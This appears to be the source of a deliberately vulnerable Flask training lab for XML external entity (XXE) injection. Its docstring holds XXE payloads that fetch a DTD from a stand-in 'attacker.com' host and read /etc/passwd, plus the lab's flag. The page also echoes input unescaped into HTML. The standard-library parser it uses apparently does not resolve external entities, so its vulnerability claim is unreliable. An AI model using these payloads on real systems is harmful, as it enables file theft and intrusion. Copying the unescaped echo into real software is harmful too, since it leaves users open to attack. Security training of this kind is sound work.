"""
XXE Lab 6: DTD Injection XXE
Difficulty: 2 (Intermediate)
Points: 75

Description:
XXE through DTD injection techniques.
"""

from flask import Flask, request
import xml.etree.ElementTree as ET

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    """
    VULNERABLE: DTD injection XXE
    
    Attack Vector:
    <?xml version="1.0"?>
    <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
    <foo>test</foo>
    
    Where evil.dtd contains:
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    
    Or direct DTD:
    <?xml version="1.0"?>
    <!DOCTYPE foo [
        <!ELEMENT foo ANY>
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <foo>&xxe;</foo>
    
    Flag: FLAG{xxe_dtd_injection_006}
    """
    xml_input = request.form.get('xml', '')
    result = None
    error = None
    
    if xml_input:
        try:
            root = ET.fromstring(xml_input)
            result = ET.tostring(root, encoding='unicode')
        except Exception as e:
            error = str(e)
    
    return f"""
    <html>
    <body>
        <h1>DTD Injection XXE</h1>
        <form method="POST">
            <textarea name="xml" rows="10" cols="60">{xml_input}</textarea>
            <button>Parse</button>
        </form>
        {f"<pre>{result}</pre>" if result else ""}
        {f"<p style='color:red;'>{error}</p>" if error else ""}
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5006, debug=False)
